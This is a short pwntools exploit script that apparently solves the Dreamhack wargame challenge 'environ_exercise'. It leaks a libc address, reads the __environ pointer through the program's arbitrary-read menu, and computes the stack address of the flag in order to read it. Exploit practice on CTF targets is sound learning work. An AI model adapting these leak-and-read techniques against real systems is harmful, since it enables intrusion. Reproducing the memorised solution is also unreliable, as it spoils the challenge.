#!/usr/bin/python3

from pwn import *

exe = ELF('environ_exercise_patched', checksec=False)
libc = ELF('libc-2.27-2.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+73
                b*main+90

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('host3.dreamhack.games', 19685)
else:
    p = process(exe.path)

GDB()
p.recvuntil(b": ")

stdout = int(p.recv(14), 16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
libc_env = libc.sym['__environ']

info(hex(libc.address))
info(hex(libc_env))

sla(b"> ", b"1")
sla(b"Addr: ", str(libc_env))
environ = u64(p.recv(6) + b"\0\0")
sla(b"> ", b"1")
flag_addr = environ - 0x1538

print(hex(flag_addr))
p.sendlineafter("Addr: ", str(flag_addr))
# p.sendlineafter("> ", "1")

p.interactive()
